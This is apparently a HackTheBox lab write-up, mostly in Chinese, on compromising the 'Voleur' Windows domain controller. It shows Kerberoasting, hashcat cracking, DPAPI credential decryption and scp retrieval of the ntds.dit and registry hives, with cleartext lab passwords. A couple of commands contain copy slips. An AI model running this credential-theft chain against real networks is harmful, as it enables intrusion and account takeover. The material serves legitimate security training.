---
title: HackTheBox — Voleur  
date: 2026-01-02 00:00:00 +0800      
categories: [hackthebox machines]          
tags: [hackthebox]         
toc: true                           
comments: false                    
math: false                          
mermaid: false                
---

- **OS**: Windows
- **Difficulty**: Medium

![image-20260214030948465](assets/img/image-20260214030948465.png)

## Service Enumeration

**Port Scan Results**

```
└─$ sudo nmap -Pn 10.10.11.76 -sVC
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 00:27 EDT
Nmap scan report for 10.10.11.76
Host is up (0.14s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-01 12:02:26Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-09-01T12:02:35
|_  start_date: N/A
|_clock-skew: 7h34m44s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.45 seconds
```

## Initial Access

```
└─$ nxc ldap 10.10.11.76 -u ryan.naylor -p 'HollowOct31Nyt'
LDAP        10.10.11.76     389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        10.10.11.76     389    DC               [-] voleur.htb\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
```

添加 DNS 紀錄

```bash
└─$ echo '10.10.11.76    dc.voleur.htb voleur.htb dc' | sudo tee -a /etc/hosts
10.10.11.76    dc.voleur.htb voleur.htb dc
```

kerberoasing 取得 svc_winrm 的 hash

![image-20260214030953054](assets/img/image-20260214030953054.png)

hashcat 破解出 svc_winrm 的密碼 AFireInsidedeOzarctica980219afi

```bash
└─$ hashcat kerberoastables.txt /usr/share/wordlists/rockyou.txt
```

![image-20260214030955436](assets/img/image-20260214030955436.png)

產生 Kerberos TGT 以及 krb5.conf檔案

```
└─$ faketime "$(ntpdate -q dc.voleur.htb | cut -d ' ' -f 1,2)" impacket-getTGT -dc-ip 10.10.11.76 voleur.htb/svc_winrm:'AFireInsidedeOzarctica980219afi'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_winrm.ccache
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ export KRB5CCNAME=$(pwd)/svc_ldap.ccache
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ netexec smb dc.voleur.htb -u svc_winrm -p AFireInsidedeOzarctica980219afi --generate-krb5-file krb5.conf -k                           
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_winrm:AFireInsidedeOzarctica980219afi KRB_AP_ERR_SKEW 
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ faketime "$(ntpdate -q dc.voleur.htb | cut -d ' ' -f 1,2)" netexec smb dc.voleur.htb -u svc_winrm -p AFireInsidedeOzarctica980219afi --generate-krb5-file krb5.conf -k
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\svc_winrm:AFireInsidedeOzarctica980219afi 
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ export KRB5_CONFIG=/home/kali/krb5.conf
```

用 evil-winrm 登入 svc_winrm

![image-20260214030959240](assets/img/image-20260214030959240.png)

**user.txt value:**

```bash
*Evil-WinRM* PS C:\Users\svc_winrm\desktop> cat user.txt
<REDACTED>
```

## Privilege Escalation

下載所有 smb share

```bash
└─$ faketime "$(ntpdate -q dc.voleur.htb | cut -d ' ' -f 1,2)" \
nxc smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k -M spider_plus -o DOWNLOAD_FLAG=True
```

![image-20260214031002561](assets/img/image-20260214031002561.png)

在 IT share 有一個 `Access_Review.xlsx` 需要密碼開啟, 用 office2john 產生 hash

![image-20260214031004945](assets/img/image-20260214031004945.png)

hashcat 爆破出密碼 `football`

```bash
└─$ hashcat hash /usr/share/wordlists/rockyou.txt --user
```

![image-20260214031007625](assets/img/image-20260214031007625.png)

打開後發現密碼 svc_ldap:M1XyC9pW7qT5Vn

![image-20260214031010576](assets/img/image-20260214031010576.png)

使用 netexec 的 bloodhound 模組收集資料

```bash
└─$ faketime "$(ntpdate -q dc.voleur.htb | cut -d ' ' -f 1,2)" \
nxc ldap dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --bloodhound --collection All --dns-server 10.10.11.76
```

![image-20260214031013243](assets/img/image-20260214031013243.png)

```
└─$ bloodhound
```

![image-20260214031015538](assets/img/image-20260214031015538.png)

svc_ldap 是 restore_users 群組成員, 配合剛剛的發現, svc_ldap 可以 restore todd.wolfe 的帳號

![image-20260214031018990](assets/img/image-20260214031018990.png)

![todd.wolfe](https://cdn-images-1.medium.com/max/800/1*91j8Z_Btf4wyhGWPKlxc3Q.png)

使用 runascs 取得 svc_ldap 的 shell

- [https://github.com/antonioCoco/RunasCs](https://github.com/antonioCoco/RunasCs)

![image-20260214031021692](assets/img/image-20260214031021692.png)

恢復 todd.wolfe 的帳號

![image-20260214031024161](assets/img/image-20260214031024161.png)

再用 runascs 拿到 todd.wolfe 的 shell

![image-20260214031026356](assets/img/image-20260214031026356.png)

下載 dpapi master key 檔案, 並利用 todd.wolf 的密碼解密出 key

![image-20260214031029193](assets/img/image-20260214031029193.png)

下載 dpapi credentials blob 檔案

```
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Credentials> copy .\772275FAD58525253490A9B0039791D3 x:\
copy .\772275FAD58525253490A9B0039791D3 x:\
```

![image-20260214031032829](assets/img/image-20260214031032829.png)

解密 credentials 出 jeremy.combs:qT3V9pLXyN7W4m

![image-20260214031034887](assets/img/image-20260214031034887.png)

再用 runascs 拿到 jeremy.combs 的 shell

![image-20260214031037551](assets/img/image-20260214031037551.png)

發現有 ssh 私鑰 id_rsa

![image-20260214031039857](assets/img/image-20260214031039857.png)

使用此私鑰登入 svc_backup帳號

![image-20260214031042578](assets/img/image-20260214031042578.png)

發現 /mnt 掛載 c:\

![image-20260214031045539](assets/img/image-20260214031045539.png)

下載 SYSTEM、SECURITY、ntds.dit

```
└─$ scp -P 2222 -i id_rsa svc_backup@10.10.11.76:"/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM" /home/kali/SYSTEM
SYSTEM                                                                                                                    100%   18MB  20.5KB/s   14:32    
                                                                                                                                                            

└─$ scp -P 2222 -i id_rsa svc_backup@10.10.11.76:"/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM" /home/kali/SECURITY
SYSTEM                                                                                                                    100%   18MB  47.4KB/s   06:17    
                                                                                                                                                           
                                                                                                                                                            
└─$ scp -P 2222 -i id_rsa svc_backup@10.10.11.76:"/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit" /home/kali/NTDS
ntds.dit
```

本地解密出 administrator 的 hash

![image-20260214031048477](assets/img/image-20260214031048477.png)

最後用 hash 產生 TGT

![image-20260214031050792](assets/img/image-20260214031050792.png)

evil-winrm 登入 administrator 拿到 shell

![image-20260214031053176](assets/img/image-20260214031053176.png)

**root.txt value:**

```bash
*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
<REDACTED>
```
